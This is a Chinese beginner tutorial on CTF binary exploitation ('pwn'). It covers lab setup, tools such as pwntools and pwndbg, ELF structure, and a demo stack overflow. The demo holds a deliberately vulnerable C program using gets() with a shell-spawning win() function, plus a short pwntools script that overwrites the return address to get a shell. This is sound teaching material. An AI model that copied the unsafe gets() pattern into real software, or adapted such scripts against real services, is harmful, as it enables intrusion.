# Pwn入门教程：P1：环境配置与基础概念 🚀

![](img/7aa482f7a9bd4b43feb242ef67567de7_1.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_3.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_5.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_7.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_9.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_11.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_13.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_15.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_17.png)

在本节课中，我们将要学习Pwn方向的基础知识，包括环境配置、基本概念、常用工具介绍以及一个简单的攻击演示。Pwn是CTF中二进制安全的重要方向，涉及利用程序漏洞获取系统控制权。

![](img/7aa482f7a9bd4b43feb242ef67567de7_19.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_21.png)

## 概述

![](img/7aa482f7a9bd4b43feb242ef67567de7_23.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_24.png)

本节课内容分为以下几个部分：
1.  Pwn攻击流程简介。
2.  Linux虚拟机环境配置。
3.  Pwn常用工具介绍与安装。
4.  Linux可执行文件（ELF）简介。
5.  一个简单的Pwn攻击手法演示。

![](img/7aa482f7a9bd4b43feb242ef67567de7_26.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_28.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_30.png)

---

![](img/7aa482f7a9bd4b43feb242ef67567de7_32.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_34.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_36.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_37.png)

## Pwn攻击流程简介 ⚙️

![](img/7aa482f7a9bd4b43feb242ef67567de7_39.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_41.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_43.png)

Pwn攻击的核心目标是利用远程服务程序的漏洞，获取该程序所在系统的控制权（通常是获得一个shell）。其基本流程可以抽象为以下几个步骤。

![](img/7aa482f7a9bd4b43feb242ef67567de7_45.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_47.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_49.png)

以下是Pwn攻击的标准流程：

![](img/7aa482f7a9bd4b43feb242ef67567de7_51.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_52.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_54.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_56.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_58.png)

1.  **获取目标程序**：从题目或目标服务器下载可执行文件（ELF文件）。
2.  **检查程序保护**：使用 `checksec` 等工具查看程序开启了哪些安全保护机制（如栈溢出保护、地址随机化等）。
3.  **逆向分析程序**：使用IDA Pro等反编译工具分析程序逻辑，寻找潜在的漏洞（如缓冲区溢出、格式化字符串漏洞等）。
4.  **编写利用脚本**：根据找到的漏洞，使用Python（通常借助Pwntools库）编写攻击脚本（Exploit）。
5.  **发起攻击**：运行脚本，连接目标服务的IP和端口，发送精心构造的恶意数据。
6.  **获取控制权**：成功利用漏洞后，获得目标系统的shell权限，进而读取flag或进行其他操作。

![](img/7aa482f7a9bd4b43feb242ef67567de7_60.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_62.png)

## Linux虚拟机环境配置 💻

![](img/7aa482f7a9bd4b43feb242ef67567de7_64.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_66.png)

上一节我们介绍了Pwn的攻击流程，本节中我们来看看如何搭建一个用于Pwn学习的Linux环境。一个纯净、专用的环境可以避免很多依赖冲突问题。

![](img/7aa482f7a9bd4b43feb242ef67567de7_68.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_70.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_72.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_73.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_75.png)

我们将使用Ubuntu 24.04 LTS版本，因为它较新，能减少因工具版本过旧导致的兼容性问题。

![](img/7aa482f7a9bd4b43feb242ef67567de7_77.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_78.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_80.png)

以下是详细的Ubuntu虚拟机安装步骤：

![](img/7aa482f7a9bd4b43feb242ef67567de7_82.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_84.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_85.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_87.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_89.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_91.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_93.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_95.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_96.png)

1.  **下载镜像**：从Ubuntu官网下载Ubuntu 24.04 Desktop版的ISO镜像文件。
2.  **创建虚拟机**：在VMware中新建虚拟机，选择“典型”安装，并指向下载的ISO文件。
3.  **配置虚拟机**：
    *   设置用户名和密码（例如，用户名 `pwn`，密码 `pwn`）。
    *   为虚拟机命名（例如 `pwn`）。
    *   指定虚拟机磁盘的存放位置（建议不要放在C盘）。
    *   设置最大磁盘大小为200GB（使用动态分配，实际占用不会这么大）。
    *   处理器数量建议设置为2核4线程。
4.  **安装系统**：启动虚拟机，按照向导完成Ubuntu系统的安装。安装语言建议选择英文，以便更准确地搜索错误信息。
5.  **安装完成**：安装结束后重启系统，使用设置的用户名和密码登录。

![](img/7aa482f7a9bd4b43feb242ef67567de7_97.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_99.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_100.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_101.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_103.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_105.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_107.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_109.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_111.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_113.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_115.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_117.png)

## Pwn常用工具介绍与安装 🛠️

![](img/7aa482f7a9bd4b43feb242ef67567de7_119.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_121.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_123.png)

环境搭建好后，我们需要安装一系列Pwn学习和做题所必需的工具。这些工具涵盖了编译、调试、漏洞利用等多个方面。

![](img/7aa482f7a9bd4b43feb242ef67567de7_125.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_127.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_129.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_131.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_133.png)

我们将按照以下列表逐一安装和介绍这些工具。

![](img/7aa482f7a9bd4b43feb242ef67567de7_135.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_137.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_138.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_140.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_142.png)

### 基础系统工具与编译器

![](img/7aa482f7a9bd4b43feb242ef67567de7_144.png)

*   **`git`**：版本控制工具，用于从代码仓库克隆项目。
*   **`gcc`**：GNU C编译器，用于将C语言源代码编译成可执行程序。其编译命令基本格式为：`gcc source.c -o executable`。
*   **`python3` & `pip`**：Python3解释器及其包管理工具，是编写攻击脚本的主要语言。
*   **`qemu`**：处理器模拟器，可以运行不同架构（如ARM、MIPS）的可执行文件。
*   **`gdb-multiarch`**：支持多架构的GNU调试器，配合Qemu可以调试非x86架构的程序。

![](img/7aa482f7a9bd4b43feb242ef67567de7_146.png)

### Pwn专用工具库

![](img/7aa482f7a9bd4b43feb242ef67567de7_148.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_150.png)

*   **`pwntools`**：Pwn领域最核心的Python库。它封装了本地/远程连接、数据打包/解包、shellcode生成、调试等大量功能，极大简化了Exploit编写工作。安装后，在Python中 `from pwn import *` 即可使用。
*   **`pwndbg`**：一个强大的GDB插件，提供了更直观的界面和更丰富的调试命令（如堆块分析、内存查看），是替代`peda`、`gef`的现代选择。
*   **`ROPGadget`**：用于在二进制文件中搜索可用的gadget（小段指令序列），是构造ROP（返回导向编程）链攻击的必备工具。
*   **`seccomp-tools`**：用于分析程序的seccomp沙箱规则，了解程序对系统调用的限制。
*   **`patchelf`** & `glibc-all-in-one`：用于修改ELF文件的动态链接库或解释器，在本地搭建与题目完全相同的运行环境时非常有用。

![](img/7aa482f7a9bd4b43feb242ef67567de7_152.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_154.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_156.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_158.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_160.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_162.png)

### 终端美化 (可选但推荐)

![](img/7aa482f7a9bd4b43feb242ef67567de7_163.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_164.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_165.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_167.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_168.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_170.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_172.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_174.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_176.png)

*   **`zsh` & `oh-my-zsh`**：替代默认的bash shell，提供更强大的自动补全、主题插件和更好的用户体验。

![](img/7aa482f7a9bd4b43feb242ef67567de7_178.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_180.png)

安装这些工具时，如果遇到网络问题（如从GitHub克隆慢），可以尝试更换国内镜像源或使用代理。

![](img/7aa482f7a9bd4b43feb242ef67567de7_182.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_184.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_186.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_188.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_190.png)

## Linux可执行文件（ELF）简介 📁

![](img/7aa482f7a9bd4b43feb242ef67567de7_192.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_194.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_196.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_198.png)

要分析漏洞，首先需要了解被攻击的对象——Linux下的可执行文件格式ELF。ELF文件包含了程序运行所需的所有信息。

![](img/7aa482f7a9bd4b43feb242ef67567de7_200.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_202.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_204.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_205.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_207.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_209.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_211.png)

我们可以使用 `file` 命令查看一个文件是否为ELF文件及其架构，使用 `checksec` 命令检查其开启的安全保护。

![](img/7aa482f7a9bd4b43feb242ef67567de7_213.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_215.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_217.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_218.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_220.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_222.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_224.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_226.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_228.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_230.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_231.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_232.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_233.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_234.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_236.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_237.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_239.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_241.png)

一个ELF文件通常包含以下部分：
*   **ELF头**：标识文件类型、目标架构、入口点地址等元信息。
*   **程序头表**：告诉系统如何创建进程内存映像。
*   **节头表**：包含链接和重定位所需的数据，如代码节（.text）、数据节（.data）等。
*   **.text节**：存放程序的机器指令（代码）。
*   **.data节**：存放已初始化的全局变量和静态变量。
*   **.bss节**：存放未初始化的全局变量和静态变量。

![](img/7aa482f7a9bd4b43feb242ef67567de7_243.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_244.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_246.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_248.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_249.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_250.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_252.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_254.png)

在漏洞利用中，我们经常关注程序在内存中的布局，特别是**栈**和**堆**：
*   **栈**：用于存储函数调用时的局部变量、返回地址等。栈溢出是经典的漏洞类型。
*   **堆**：用于动态内存分配（如`malloc`）。堆上的漏洞利用（如Use-After-Free）更为复杂。

![](img/7aa482f7a9bd4b43feb242ef67567de7_256.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_257.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_259.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_261.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_262.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_264.png)

## 一个简单的Pwn攻击演示 🎯

![](img/7aa482f7a9bd4b43feb242ef67567de7_266.png)

现在，让我们将前面所学的知识串联起来，完成一个最简单的Pwn攻击演示。我们将攻击一个存在栈缓冲区溢出漏洞的示例程序。

假设我们已经有一个名为 `vulnerable` 的ELF程序，它有一个函数 `vuln` 使用了不安全的 `gets` 函数。

![](img/7aa482f7a9bd4b43feb242ef67567de7_268.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_270.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_272.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_273.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_274.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_276.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_278.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_280.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_282.png)

```c
#include <stdio.h>
void win() {
    system("/bin/sh"); // 后门函数
}
void vuln() {
    char buffer[64];
    gets(buffer); // 危险函数，不检查输入长度
}
int main() {
    vuln();
    return 0;
}
```

攻击步骤如下：

![](img/7aa482f7a9bd4b43feb242ef67567de7_284.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_286.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_287.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_289.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_291.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_293.png)

1.  **分析**：用 `checksec vulnerable` 查看保护，发现可能只开启了NX（栈不可执行）。用IDA分析，找到 `vuln` 函数和 `win` 函数地址。
2.  **计算偏移**：通过调试（例如在`pwndbg`中cyclic生成字符串），计算出从输入缓冲区开始到覆盖函数返回地址所需的字节数。假设偏移为 `72` 字节。
3.  **构造Payload**：我们的目标是让程序执行 `win` 函数。Payload结构为：`72个填充字符 + win函数的地址`。
4.  **编写脚本**：
    ```python
    from pwn import *
    # 连接本地程序
    p = process('./vulnerable')
    # 或连接远程服务
    # p = remote('靶机IP', 端口号)
    win_addr = 0x401157  # 假设通过IDA找到的win函数地址
    payload = b'A' * 72 + p64(win_addr)
    p.sendline(payload)
    p.interactive() # 切换到交互模式，获得shell
    ```
5.  **获取Shell**：运行脚本，如果成功，我们将获得一个shell，可以执行 `cat flag` 等命令。

![](img/7aa482f7a9bd4b43feb242ef67567de7_295.png)

这个演示展示了最基本的**返回地址覆盖**攻击。现代系统有更多保护机制（如ASLR, Canary），需要更复杂的绕过技术，但核心思想相通：**控制程序的执行流**。

![](img/7aa482f7a9bd4b43feb242ef67567de7_297.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_299.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_301.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_303.png)

---

![](img/7aa482f7a9bd4b43feb242ef67567de7_305.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_307.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_309.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_311.png)

## 总结

![](img/7aa482f7a9bd4b43feb242ef67567de7_313.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_315.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_317.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_319.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_321.png)

本节课中我们一起学习了Pwn入门的基础知识。我们首先了解了Pwn攻击的完整流程，然后一步步搭建了Ubuntu虚拟机和必备的工具环境。接着，我们介绍了ELF文件格式和内存布局的基本概念。最后，通过一个简单的栈溢出漏洞演示，将分析、利用、编写脚本的过程串联起来，实现了第一次“攻破”程序。

![](img/7aa482f7a9bd4b43feb242ef67567de7_323.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_325.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_327.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_329.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_331.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_333.png)

![](img/7aa482f7a9bd4b43feb242ef67567de7_334.png)

记住，Pwn的学习曲线初期较为陡峭，需要扎实的C语言、汇编和操作系统基础。但从环境搭建开始，亲手分析每一个漏洞，编写每一个Exploit，是掌握这门技术的最佳途径。